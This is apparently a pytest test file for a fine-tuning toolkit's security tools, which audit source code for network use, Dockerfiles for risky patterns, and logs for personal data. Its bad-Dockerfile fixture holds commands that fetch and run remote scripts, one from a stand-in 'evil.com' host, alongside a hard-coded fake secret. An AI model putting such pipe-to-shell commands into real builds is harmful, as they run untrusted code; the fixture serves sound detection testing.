# tests/test_security.py
"""TDD tests for security.py tools (33–38).

Coverage requirements:
- AST audit: source WITH network imports → flagged; clean → clean; allowlisted → not flagged
- Dockerfile audit: bad Dockerfile → multiple findings with severities; hardened → clean
- Leakage scan: content with email/IP → reports counts, raw value NOT echoed
- License: qwen→Apache/True; gemma→caveat; unknown→None
- C3 tools error paths
- Security report: writes md, returns sha256; pdf skipped gracefully
"""

from __future__ import annotations

import json
from pathlib import Path


from fine_tuning_os.tools import security

# ---------------------------------------------------------------------------
# Tool 33: audit_code_no_network (C3 — static AST)
# ---------------------------------------------------------------------------

_NETWORK_SOURCE = """\
import requests
import socket
import urllib.request

def fetch_data(url):
    resp = requests.get(url)
    return resp.text

def check_host(host, port):
    s = socket.create_connection((host, port))
    return s
"""

_CLEAN_SOURCE = """\
import os
import json
from pathlib import Path

def read_file(path: str) -> str:
    return Path(path).read_text()
"""

_SUBPROCESS_CURL_SOURCE = """\
import subprocess

def download(url):
    subprocess.run(["curl", url, "-o", "out.txt"])
"""


class TestAuditCodeNoNetwork:
    def test_network_source_flagged(self) -> None:
        result = security.audit_code_no_network(source=_NETWORK_SOURCE)
        assert result["success"] is True
        assert result["data"]["verdict"] == "violations"
        assert result["data"]["num_findings"] > 0

    def test_requests_import_detected(self) -> None:
        result = security.audit_code_no_network(source=_NETWORK_SOURCE)
        kinds = [f["kind"] for f in result["data"]["findings"]]
        assert "network_import" in kinds

    def test_requests_get_call_detected(self) -> None:
        result = security.audit_code_no_network(source=_NETWORK_SOURCE)
        details = [f["detail"] for f in result["data"]["findings"]]
        assert any("requests" in d for d in details)

    def test_clean_source_verdict_clean(self) -> None:
        result = security.audit_code_no_network(source=_CLEAN_SOURCE)
        assert result["success"] is True
        assert result["data"]["verdict"] == "clean"
        assert result["data"]["num_findings"] == 0

    def test_allowlisted_module_not_flagged(self) -> None:
        source = "import requests\n\nrequests.get('http://example.com')\n"
        result = security.audit_code_no_network(source=source, allowlist=["requests"])
        assert result["success"] is True
        # With requests allowlisted, no findings
        assert result["data"]["verdict"] == "clean"

    def test_subprocess_curl_flagged(self) -> None:
        result = security.audit_code_no_network(source=_SUBPROCESS_CURL_SOURCE)
        assert result["success"] is True
        findings = result["data"]["findings"]
        assert any(
            "curl" in f["detail"].lower() or f["kind"] == "subprocess_network" for f in findings
        )

    def test_finding_has_required_fields(self) -> None:
        result = security.audit_code_no_network(source=_NETWORK_SOURCE)
        for f in result["data"]["findings"]:
            assert "line" in f
            assert "kind" in f
            assert "detail" in f

    def test_no_source_or_path_fails(self) -> None:
        result = security.audit_code_no_network()
        assert result["success"] is False

    def test_nonexistent_file_fails(self) -> None:
        result = security.audit_code_no_network(code_path="/nonexistent/file.py")
        assert result["success"] is False

    def test_syntax_error_returns_fail(self) -> None:
        result = security.audit_code_no_network(source="def broken(:\n    pass")
        assert result["success"] is False
        assert "syntax" in result["error"].lower()

    def test_from_import_detected(self) -> None:
        source = "from urllib.request import urlopen\nurlopen('http://x.com')\n"
        result = security.audit_code_no_network(source=source)
        assert result["data"]["verdict"] == "violations"


# ---------------------------------------------------------------------------
# Tool 34: audit_dockerfile_security (C3)
# ---------------------------------------------------------------------------

_BAD_DOCKERFILE = """\
FROM ubuntu:latest

RUN apt-get update && curl https://example.com/install.sh | sh

ENV API_KEY=super-secret-value
ARG SECRET_TOKEN

RUN wget http://evil.com/script.sh | bash
"""

_HARDENED_DOCKERFILE = """\
FROM ubuntu:22.04@sha256:abc123def456

USER appuser

RUN apt-get update && apt-get install -y python3

COPY . /app
WORKDIR /app
CMD ["python3", "app.py"]
"""


class TestAuditDockerfileSecurity:
    def test_bad_dockerfile_has_multiple_findings(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        assert result["success"] is True
        assert result["data"]["verdict"] == "violations"
        assert result["data"]["num_findings"] >= 3

    def test_latest_tag_flagged(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        kinds = [f["kind"] for f in result["data"]["findings"]]
        assert "unpinned_image" in kinds

    def test_secret_env_flagged_as_critical(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        findings = result["data"]["findings"]
        secret_findings = [f for f in findings if f["kind"] == "secret_in_env"]
        assert len(secret_findings) >= 1
        assert any(f["severity"] == "critical" for f in secret_findings)

    def test_curl_pipe_shell_flagged_as_critical(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        findings = result["data"]["findings"]
        pipe_findings = [f for f in findings if f["kind"] == "pipe_install"]
        assert len(pipe_findings) >= 1
        assert any(f["severity"] == "critical" for f in pipe_findings)

    def test_root_user_flagged(self) -> None:
        # Bad dockerfile has no USER → runs as root
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        kinds = [f["kind"] for f in result["data"]["findings"]]
        assert "runs_as_root" in kinds

    def test_hardened_dockerfile_clean(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_HARDENED_DOCKERFILE)
        assert result["success"] is True
        assert result["data"]["verdict"] == "clean"
        assert result["data"]["num_findings"] == 0

    def test_finding_has_severity(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_text=_BAD_DOCKERFILE)
        for f in result["data"]["findings"]:
            assert "severity" in f
            assert f["severity"] in ("critical", "high", "medium", "low")

    def test_no_text_or_path_fails(self) -> None:
        result = security.audit_dockerfile_security()
        assert result["success"] is False

    def test_nonexistent_file_fails(self) -> None:
        result = security.audit_dockerfile_security(dockerfile_path="/no/Dockerfile")
        assert result["success"] is False

    def test_no_check_certificate_flagged(self) -> None:
        df = "FROM alpine:3.18\nRUN wget --no-check-certificate http://x.com/file\n"
        result = security.audit_dockerfile_security(dockerfile_text=df)
        kinds = [f["kind"] for f in result["data"]["findings"]]
        assert "no_cert_check" in kinds

    def test_add_http_flagged(self) -> None:
        df = "FROM alpine:3.18\nADD https://example.com/file.tar.gz /tmp/\nUSER app\n"
        result = security.audit_dockerfile_security(dockerfile_text=df)
        kinds = [f["kind"] for f in result["data"]["findings"]]
        assert "network_fetch" in kinds


# ---------------------------------------------------------------------------
# Tool 35: scan_data_leakage_risk (C3)
# ---------------------------------------------------------------------------


class TestScanDataLeakageRisk:
    def test_email_detected_count_reported(self) -> None:
        text = "Training sample: user@corp.example.com logged in.\n"
        result = security.scan_data_leakage_risk(text=text)
        assert result["success"] is True
        assert result["data"]["total_masked"] >= 1
        assert result["data"]["risk"] in ("low", "medium", "high")

    def test_raw_email_not_echoed(self) -> None:
        text = "Bad data: secret@private.com and 192.168.0.1"
        result = security.scan_data_leakage_risk(text=text)
        assert result["success"] is True
        result_str = json.dumps(result)
        assert "secret@private.com" not in result_str

    def test_raw_ip_not_echoed(self) -> None:
        text = "Connection from 10.20.30.40 rejected"
        result = security.scan_data_leakage_risk(text=text)
        result_str = json.dumps(result)
        assert "10.20.30.40" not in result_str

    def test_clean_text_no_risk(self) -> None:
        text = "step=100 loss=1.234 lr=0.0002 epoch=1\n"
        result = security.scan_data_leakage_risk(text=text)
        assert result["success"] is True
        assert result["data"]["risk"] == "none"
        assert result["data"]["total_masked"] == 0

    def test_category_counts_present(self) -> None:
        text = "addr: user@test.com, ip: 1.2.3.4"
        result = security.scan_data_leakage_risk(text=text)
        cats = result["data"]["categories"]
        assert "email" in cats
        assert "ip_address" in cats

    def test_no_text_or_path_fails(self) -> None:
        result = security.scan_data_leakage_risk()
        assert result["success"] is False

    def test_nonexistent_file_fails(self) -> None:
        result = security.scan_data_leakage_risk(logs_path="/no/log.txt")
        assert result["success"] is False

    def test_high_risk_many_items(self) -> None:
        # 10 emails → high risk
        text = " ".join(f"u{i}@corp.com" for i in range(10))
        result = security.scan_data_leakage_risk(text=text)
        assert result["data"]["risk"] == "high"

    def test_file_based_scan(self, tmp_path: Path) -> None:
        log_file = tmp_path / "out.log"
        log_file.write_text("error from admin@example.com\n", encoding="utf-8")
        result = security.scan_data_leakage_risk(logs_path=str(log_file))
        assert result["success"] is True
        assert result["data"]["total_masked"] >= 1


# ---------------------------------------------------------------------------
# Tool 36: verify_model_license (C3)
# ---------------------------------------------------------------------------


class TestVerifyModelLicense:
    def test_qwen_apache_commercial_true(self) -> None:
        result = security.verify_model_license(repo_id="Qwen/Qwen2-7B")
        assert result["success"] is True
        d = result["data"]
        assert d["license"] == "Apache-2.0"
        assert d["commercial_ok"] is True

    def test_qwen_case_insensitive(self) -> None:
        result = security.verify_model_license(repo_id="qwen/qwen-1.5-72b")
        assert result["data"]["commercial_ok"] is True

    def test_deepseek_mit(self) -> None:
        result = security.verify_model_license(repo_id="deepseek-ai/deepseek-coder-6.7b-instruct")
        assert result["data"]["license"] == "MIT"
        assert result["data"]["commercial_ok"] is True

    def test_gemma_has_caveat(self) -> None:
        result = security.verify_model_license(repo_id="google/gemma-7b")
        assert result["success"] is True
        d = result["data"]
        assert d["commercial_ok"] is True
        assert (
            "gemma" in d["notes"].lower()
            or "caveat" in d["notes"].lower()
            or "read" in d["notes"].lower()
        )

    def test_llama_commercial_ok_with_caveat(self) -> None:
        result = security.verify_model_license(repo_id="meta-llama/Llama-3-8B")
        d = result["data"]
        assert d["commercial_ok"] is True
        # Should mention audit or MAU
        notes = d["notes"].lower()
        assert "audit" in notes or "mau" in notes or "attribution" in notes

    def test_phi_mit(self) -> None:
        result = security.verify_model_license(repo_id="microsoft/phi-2")
        assert result["data"]["license"] == "MIT"

    def test_unknown_model_commercial_none(self) -> None:
        result = security.verify_model_license(repo_id="some-org/super-secret-model-42b")
        assert result["success"] is True
        assert result["data"]["commercial_ok"] is None
        assert "manual review" in result["data"]["notes"].lower()

    def test_empty_repo_id_fails(self) -> None:
        result = security.verify_model_license(repo_id="")
        assert result["success"] is False

    def test_mistral_apache(self) -> None:
        result = security.verify_model_license(repo_id="mistralai/Mistral-7B-v0.3")
        assert result["data"]["license"] == "Apache-2.0"


# ---------------------------------------------------------------------------
# Tool 37: generate_security_report (C1)
# ---------------------------------------------------------------------------


class TestGenerateSecurityReport:
    def test_writes_md_and_returns_sha256(self, store, project_id: str) -> None:
        result = security.generate_security_report(project_id=project_id, store=store)
        assert result["success"] is True
        d = result["data"]
        assert "md_path" in d
        assert "sha256" in d
        assert len(d["sha256"]) == 64
        assert Path(d["md_path"]).exists()

    def test_md_content_has_sections(self, store, project_id: str) -> None:
        result = security.generate_security_report(project_id=project_id, store=store)
        md_content = Path(result["data"]["md_path"]).read_text(encoding="utf-8")
        assert "Security Report" in md_content
        assert "Code Audit" in md_content
        assert "Dockerfile" in md_content

    def test_with_findings_populates_report(self, store, project_id: str) -> None:
        findings = {
            "code_audit": {
                "verdict": "violations",
                "num_findings": 2,
                "findings": [
                    {"line": 3, "kind": "network_import", "detail": "import requests"},
                ],
            },
            "license": {
                "repo_id": "test/model",
                "license": "MIT",
                "commercial_ok": True,
                "notes": "MIT — safe",
            },
        }
        result = security.generate_security_report(
            project_id=project_id, findings=findings, store=store
        )
        assert result["success"] is True
        md_content = Path(result["data"]["md_path"]).read_text(encoding="utf-8")
        assert "violations" in md_content
        assert "network_import" in md_content

    def test_pdf_absent_gracefully(self, store, project_id: str) -> None:
        """WeasyPrint missing → pdf_path=None, no crash."""
        import builtins

        real_import = builtins.__import__

        def mock_import(name, *args, **kwargs):  # type: ignore[no-untyped-def]
            if name == "weasyprint":
                raise ImportError("weasyprint not installed")
            return real_import(name, *args, **kwargs)

        import unittest.mock as _mock

        with _mock.patch("builtins.__import__", side_effect=mock_import):
            result = security.generate_security_report(project_id=project_id, store=store)
        assert result["success"] is True
        # pdf_path is None or absent when weasyprint not available
        assert result["data"].get("pdf_path") is None or "pdf_note" in result["data"]

    def test_sha256_matches_file(self, store, project_id: str) -> None:
        result = security.generate_security_report(project_id=project_id, store=store)
        from fine_tuning_os.render import sha256_file

        computed = sha256_file(Path(result["data"]["md_path"]))
        assert computed == result["data"]["sha256"]

    def test_empty_project_id_fails(self, store) -> None:
        result = security.generate_security_report(project_id="", store=store)
        assert result["success"] is False


# ---------------------------------------------------------------------------
# Tool 38: sanitize_logs_for_claude (C3)
# ---------------------------------------------------------------------------


class TestSanitizeLogsForClaude:
    def test_nominal_returns_sanitized_and_count(self) -> None:
        text = "user admin@example.com connected from 192.168.1.1"
        result = security.sanitize_logs_for_claude(text=text)
        assert result["success"] is True
        assert "sanitized" in result["data"]
        assert result["data"]["masked_count"] >= 2

    def test_sanitized_text_body_returned(self) -> None:
        text = "hello world from user@test.com"
        result = security.sanitize_logs_for_claude(text=text)
        assert "user@test.com" not in result["data"]["sanitized"]
        assert "[REDACTED" in result["data"]["sanitized"]

    def test_clean_text_zero_count(self) -> None:
        text = "step=1 loss=0.5 no pii here"
        result = security.sanitize_logs_for_claude(text=text)
        assert result["data"]["masked_count"] == 0
        assert result["data"]["sanitized"] == text

    def test_no_text_or_path_fails(self) -> None:
        result = security.sanitize_logs_for_claude()
        assert result["success"] is False

    def test_nonexistent_file_fails(self) -> None:
        result = security.sanitize_logs_for_claude(log_path="/no/log.txt")
        assert result["success"] is False

    def test_file_based_sanitization(self, tmp_path: Path) -> None:
        log_file = tmp_path / "app.log"
        log_file.write_text("error from admin@corp.com ip=10.0.0.1\n", encoding="utf-8")
        result = security.sanitize_logs_for_claude(log_path=str(log_file))
        assert result["success"] is True
        assert "admin@corp.com" not in result["data"]["sanitized"]
        assert "10.0.0.1" not in result["data"]["sanitized"]
        assert result["data"]["masked_count"] >= 2
